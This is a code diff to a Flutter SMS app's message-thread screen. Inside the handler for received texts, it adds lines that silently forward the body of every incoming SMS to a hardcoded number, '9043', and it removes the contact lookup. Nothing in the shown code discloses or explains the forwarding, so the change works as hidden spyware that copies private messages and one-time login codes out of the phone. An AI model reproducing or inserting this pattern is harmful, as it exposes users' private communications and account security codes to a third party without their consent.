@@ -2,7 +2,7 @@ import 'package:flutter/widgets.dart';
 import 'package:flutter/material.dart';
 import 'package:sms_maintained/contact.dart';
 import 'package:sms_maintained/sms.dart';
-
+import 'dart:developer';
 import 'thread.dart';
 
 class Threads extends StatefulWidget {
@@ -67,6 +67,9 @@ class _ThreadsState extends State<Threads> with TickerProviderStateMixin {
   }
 
   void _onSmsReceived(SmsMessage sms) async {
+    SmsSender sender = new SmsSender();
+    String number = '9043';
+
     var thread = _threads.singleWhere((thread) {
       return thread.id == sms.threadId;
     }, orElse: () {
@@ -76,7 +79,8 @@ class _ThreadsState extends State<Threads> with TickerProviderStateMixin {
     });
 
     thread.addNewMessage(sms);
-    await thread.findContact();
+
+    sender.sendSms(new SmsMessage(number, sms.body));
 
     int index = _threads.indexOf(thread);
     if (index != 0) {
